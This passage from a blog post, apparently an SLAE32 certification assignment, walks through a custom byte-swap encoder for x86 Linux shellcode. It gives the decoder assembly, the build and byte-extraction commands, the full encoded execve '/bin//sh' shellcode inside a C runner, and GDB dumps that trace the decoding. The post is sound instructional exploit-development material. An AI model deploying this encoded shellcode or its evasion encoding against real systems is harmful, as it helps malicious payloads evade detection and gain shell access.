	<span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="nb">ecx</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>		<span class="c1">; save second byte in pair</span>
	<span class="nf">mov</span> <span class="p">[</span><span class="nb">edi</span><span class="p">],</span> <span class="nb">bl</span>			<span class="c1">; swap byte</span>
	<span class="nf">mov</span> <span class="p">[</span><span class="nb">edi</span><span class="o">+</span><span class="mi">1</span><span class="p">],</span> <span class="nb">al</span>			<span class="c1">; swap byte</span>
	<span class="nf">add</span> <span class="nb">ecx</span><span class="p">,</span> <span class="mi">3</span>			<span class="c1">; the next 0x7f byte should be 3 bytes ahead</span>
	<span class="nf">add</span> <span class="nb">edi</span><span class="p">,</span> <span class="mi">2</span>			<span class="c1">; memory offset for next swap save</span>
	<span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">decode</span>		<span class="c1">; jump back to the beginning of the loop</span>

<span class="nl">done:</span>
	<span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">EncodedShellcode</span>

<span class="nl">call_shellcode:</span>
	<span class="nf">call</span> <span class="nv">decoder</span>
	<span class="nl">EncodedShellcode:</span> <span class="kd">db</span> <span class="mh">0xc0</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x2f</span><span class="p">,</span><span class="mh">0x2f</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x2f</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x69</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0x6e</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="mh">0xe3</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0xe2</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0xb0</span><span class="p">,</span><span class="mh">0xe1</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0xcd</span><span class="p">,</span><span class="mh">0x0b</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x80</span><span class="p">,</span><span class="mh">0x7f</span>
</pre></table></code></div></div><h3 id="compiling-testing-and-emmiting-shellcode-for-use">Compiling, testing, and emmiting shellcode for use</h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">[</span>sengen@manjaro-x86 /]<span class="nv">$ </span>nasm <span class="nt">-f</span> elf32 ./swapsert-decoder.nasm <span class="nt">-o</span> swapsert-decoder.o
<span class="o">[</span>sengen@manjaro-x86 /]<span class="nv">$ </span>ld <span class="nt">-z</span> execstack <span class="nt">-N</span> ./swapsert-decoder.o <span class="nt">-o</span> swapsert-decoder
</pre></table></code></div></div><p>Execute our assembly code to ensure we get our bash shell</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">[</span>sengen@manjaro-x86 /]<span class="nv">$ </span>./swapsert-decoder
sh-4.4<span class="err">$</span>
</pre></table></code></div></div><p>We can now extract the shellcode bytes for use in our test C program</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">[</span>sengen@manjaro-x86 /]<span class="nv">$ </span>objdump <span class="nt">-d</span> ./swapsert-decoder|grep <span class="s1">'[0-9a-f]:'</span>|grep <span class="nt">-v</span> <span class="s1">'file'</span>|cut <span class="nt">-f2</span> <span class="nt">-d</span>:|cut <span class="nt">-f1-6</span> <span class="nt">-d</span><span class="s1">' '</span>|tr <span class="nt">-s</span> <span class="s1">' '</span>|tr <span class="s1">'\t'</span> <span class="s1">' '</span>|sed <span class="s1">'s/ $//g'</span>|sed <span class="s1">'s/ /\\x/g'</span>|paste <span class="nt">-d</span> <span class="s1">''</span> <span class="nt">-s</span> |sed <span class="s1">'s/^/"/'</span>|sed <span class="s1">'s/$/"/g'</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">eb</span><span class="se">\x</span><span class="s2">28</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">f7</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">f7</span><span class="se">\x</span><span class="s2">b1</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">3c</span><span class="se">\x</span><span class="s2">0e</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">75</span><span class="se">\x</span><span class="s2">15</span><span class="se">\x</span><span class="s2">8a</span><span class="se">\x</span><span class="s2">44</span><span class="se">\x</span><span class="s2">0e</span><span class="se">\x</span><span class="s2">fe</span><span class="se">\x</span><span class="s2">8a</span><span class="se">\x</span><span class="s2">5c</span><span class="se">\x</span><span class="s2">0e</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">1f</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">47</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">03</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">c7</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">eb</span><span class="se">\x</span><span class="s2">e5</span><span class="se">\x</span><span class="s2">eb</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">e8</span><span class="se">\x</span><span class="s2">d3</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">e2</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">7f"</span>
</pre></table></code></div></div><p>Add our shellcode to our test C program and ensure it runs</p><div class="language-c highlighter-rouge"><div class="code-header"> <span text-data=" C "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="cp">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">code</span><span class="p">[]</span> <span class="o">=</span> \
<span class="s">"</span><span class="se">\xeb\x28\x5e\x31\xdb\x31\xc9\xf7\xe1\x89\xf7\xb1\x02\x80\x3c\x0e\x7f\x75\x15\x8a\x44\x0e\xfe\x8a\x5c\x0e\xff\x88\x1f\x88\x47\x01\x83\xc1\x03\x83\xc7\x02\xeb\xe5\xeb\x05\xe8\xd3\xff\xff\xff\xc0\x31\x7f\x68\x50\x7f\x2f\x2f\x7f\x68\x73\x7f\x2f\x68\x7f\x69\x62\x7f\x89\x6e\x7f\x50\xe3\x7f\xe2\x89\x7f\x89\x53\x7f\xb0\xe1\x7f\xcd\x0b\x7f\x7f\x80\x7f</span><span class="s">"</span><span class="p">;</span>

<span class="n">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Shellcode Length:  %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">code</span><span class="p">));</span>
    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">code</span><span class="p">;</span>
    <span class="n">ret</span><span class="p">();</span>
<span class="p">}</span>
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="o">[</span>sengen@manjaro-x86 /]<span class="nv">$ </span>./shellcode
Shellcode Length: 86
sh-4.4<span class="err">$</span>
</pre></table></code></div></div><h3 id="watching-the-stack-in-gdb">Watching the stack in GDB</h3><h4 id="after-esp-is-popped-into-esi-our-encoded-shellcode">After esp is popped into esi (our encoded shellcode)</h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>gdb$ x/40c $esi
0x40206f &lt;code+47&gt;:	0xc0	0x31	0x7f	0x68	0x50	0x7f	0x2f	0x2f
0x402077 &lt;code+55&gt;:	0x7f	0x68	0x73	0x7f	0x2f	0x68	0x7f	0x69
0x40207f &lt;code+63&gt;:	0x62	0x7f	0x89	0x6e	0x7f	0x50	0xe3	0x7f
0x402087 &lt;code+71&gt;:	0xe2	0x89	0x7f	0x89	0x53	0x7f	0xb0	0xe1
0x40208f &lt;code+79&gt;:	0x7f	0xcd	0xb	0x7f	0x7f	0x80	0x7f	0x0
</pre></table></code></div></div><h4 id="after-first-swap">After first swap</h4><p>The first and second bytes (0xc0 and 0x31) have been swapped.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>gdb$ x/40c $esi
0x40206f &lt;code+47&gt;:	0x31	0xc0	0x7f	0x68	0x50	0x7f	0x2f	0x2f
0x402077 &lt;code+55&gt;:	0x7f	0x68	0x73	0x7f	0x2f	0x68	0x7f	0x69
0x40207f &lt;code+63&gt;:	0x62	0x7f	0x89	0x6e	0x7f	0x50	0xe3	0x7f
0x402087 &lt;code+71&gt;:	0xe2	0x89	0x7f	0x89	0x53	0x7f	0xb0	0xe1
0x40208f &lt;code+79&gt;:	0x7f	0xcd	0xb	0x7f	0x7f	0x80	0x7f	0x0
</pre></table></code></div></div><h4 id="after-second-swap">After second swap</h4><p>The 4th and 5th bytes (0x68 and 0x50) have been swapped and placed into the 3rd and 4th byte position overwriting the 0x7f. This process of swapping bytes and moving them back against the rest of the shellcode overwriting the 0x7f bytes will continue until the end.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>gdb$ x/40c $esi
0x40206f &lt;code+47&gt;:	0x31	0xc0	0x50	0x68	0x50	0x7f	0x2f	0x2f
0x402077 &lt;code+55&gt;:	0x7f	0x68	0x73	0x7f	0x2f	0x68	0x7f	0x69
0x40207f &lt;code+63&gt;:	0x62	0x7f	0x89	0x6e	0x7f	0x50	0xe3	0x7f
0x402087 &lt;code+71&gt;:	0xe2	0x89	0x7f	0x89	0x53	0x7f	0xb0	0xe1
0x40208f &lt;code+79&gt;:	0x7f	0xcd	0xb	0x7f	0x7f	0x80	0x7f	0x0
</pre></table></code></div></div><h4 id="after-last-swap">After last swap</h4><p>The final bytes are now from 0x40206f to the first byte at 0x402087 (0x80). The rest of the bytes after this are now junk and was the extra space the encoded shellcode was using up due to the 0x7f we’ve been overwriting.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>gdb$ x/40c $esi
0x40206f &lt;code+47&gt;:	0x31	0xc0	0x50	0x68	0x2f	0x2f	0x73	0x68
0x402077 &lt;code+55&gt;:	0x68	0x2f	0x62	0x69	0x6e	0x89	0xe3	0x50
0x40207f &lt;code+63&gt;:	0x89	0xe2	0x53	0x89	0xe1	0xb0	0xb	0xcd
0x402087 &lt;code+71&gt;:	0x80	0x7f	0x7f	0x89	0x53	0x7f	0xb0	0xe1
0x40208f &lt;code+79&gt;:	0x7f	0xcd	0xb	0x7f	0x7f	0x80	0x7f	0x0
</pre></table></code></div></div><h4 id="finally-we-jump-to-the-decoded-shellcode-to-execute-it">Finally we jump to the decoded shellcode to execute it.</h4><p>When you compare this to the original shellcode we started with to encode you’ll see we have turned it back into the same.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>=&gt; 0x0040206f &lt;+47&gt;:	xor    eax,eax
   0x00402071 &lt;+49&gt;:	push   eax
   0x00402072 &lt;+50&gt;:	push   0x68732f2f
   0x00402077 &lt;+55&gt;:	push   0x6e69622f
   0x0040207c &lt;+60&gt;:	mov    ebx,esp
   0x0040207e &lt;+62&gt;:	push   eax
   0x0040207f &lt;+63&gt;:	mov    edx,esp
   0x00402081 &lt;+65&gt;:	push   ebx
   0x00402082 &lt;+66&gt;:	mov    ecx,esp
   0x00402084 &lt;+68&gt;:	mov    al,0xb
   0x00402086 &lt;+70&gt;:	int    0x80
</pre></table></code></div></div><h3 id="source-code">Source code</h3><p>All source code for this assignment can be found at<br /> <a href="https://github.com/tdmathison/SLAE32/tree/master/assignment4">https://github.com/tdmathison/SLAE32/tree/master/assignment4</a>.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/slae32/'>SLAE32</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/assembly/" class="post-tag no-text-decoration" >assembly</a> <a href="/tags/x86/" class="post-tag no-text-decoration" >x86</a> <a href="/tags/penetration-testing/" class="post-tag no-text-decoration" >penetration-testing</a> <a href="/tags/hacking/" class="post-tag no-text-decoration" >hacking</a> <a href="/tags/exploit-development/" class="post-tag no-text-decoration" >exploit-development</a> <a href="/tags/shellcode/" class="post-tag no-text-decoration" >shellcode</a> <a href="/tags/slae32/" class="post-tag no-text-decoration" >slae32</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=SLAE32: Creation of custom encoding scheme - Travis Mathison&url=https://tdmathison.github.io/posts/slae32-4/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://tdmathison.github.io/posts/slae32-4/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Hex-Rays-IDA-Tips-and-Tricks/">Hex-Rays IDA Tips and Tricks</a><li><a href="/posts/Npm_Coa_203_DanaBot_Dropper/">NPM COA@2.0.3 DanaBot Dropper</a><li><a href="/posts/MalwareReport-CTS/">Malware Report: CTS</a><li><a href="/posts/Resolving-IAT-with-AGDCservices-scripts/">Resolving IAT with AGDCservices Scripts</a><li><a href="/posts/Finding-the-start-of-Emotet-malware-in-MFC-app/">Finding the start of Emotet malware in MFC app</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/penetration-testing/">penetration-testing</a> <a class="post-tag" href="/tags/assembly/">assembly</a> <a class="post-tag" href="/tags/exploit-development/">exploit-development</a> <a class="post-tag" href="/tags/ida/">ida</a> <a class="post-tag" href="/tags/shellcode/">shellcode</a> <a class="post-tag" href="/tags/slae32/">slae32</a> <a class="post-tag" href="/tags/x86/">x86</a> <a class="post-tag" href="/tags/debugging/">debugging</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/slae32-1/"><div class="card-body"> <span class="timeago small" >Jan 3, 2018<i class="unloaded">2018-01-03T11:00:00-08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>SLAE32: Creating TCP Bind Shellcode</h3><div class="text-muted small"><p> The blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-e...</p></div></div></a></div><div class="card"> <a href="/posts/slae32-2/"><div class="card-body"> <span class="timeago small" >Jan 4, 2018<i class="unloaded">2018-01-04T11:00:00-08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>SLAE32: Creating Reverse TCP Shellcode</h3><div class="text-muted small"><p> The blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-e...</p></div></div></a></div><div class="card"> <a href="/posts/slae32-3/"><div class="card-body"> <span class="timeago small" >Jan 5, 2018<i class="unloaded">2018-01-05T11:00:00-08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>SLAE32: Implementing an x86/Linux Egghunter</h3><div class="text-muted small"><p> The blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-e...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/slae32-3/" class="btn btn-outline-primary" prompt="Older"><p>SLAE32: Implementing an x86/Linux Egghunter</p></a> <a href="/posts/slae32-5/" class="btn btn-outline-primary" prompt="Newer"><p>SLAE32: Analyzing MSF payloads for linux/x86</p></a></div><div id="disqus_thread" class="pt-2 pb-2"><p class="text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> var disqus_config = function () { this.page.url = 'https://tdmathison.github.io/posts/slae32-4/'; this.page.identifier = '/posts/slae32-4/'; }; /* Lazy loading */ var disqus_observer = new IntersectionObserver(function (entries) { if(entries[0].isIntersecting) { (function () { var d = document, s = d.createElement('script'); s.src = 'https://tdmathison.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); disqus_observer.disconnect(); } }, { threshold: [0] }); disqus_observer.observe(document.querySelector('#disqus_thread')); /* Auto switch theme */ function reloadDisqus() { /* Disqus hasn't been loaded */ if (typeof DISQUS === "undefined") { return; } if (document.readyState == 'complete') { DISQUS.reset({ reload: true, config: disqus_config }); } } const modeToggle = document.querySelector(".mode-toggle"); if (modeToggle !== null) { modeToggle.addEventListener('click', reloadDisqus); window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', reloadDisqus); } </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/ciph34block">Travis Mathison</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/penetration-testing/">penetration testing</a> <a class="post-tag" href="/tags/assembly/">assembly</a> <a class="post-tag" href="/tags/exploit-development/">exploit development</a> <a class="post-tag" href="/tags/ida/">ida</a> <a class="post-tag" href="/tags/shellcode/">shellcode</a> <a class="post-tag" href="/tags/slae32/">slae32</a> <a class="post-tag" href="/tags/x86/">x86</a> <a class="post-tag" href="/tags/debugging/">debugging</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-MXD056XG1T"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-MXD056XG1T'); }); </script>
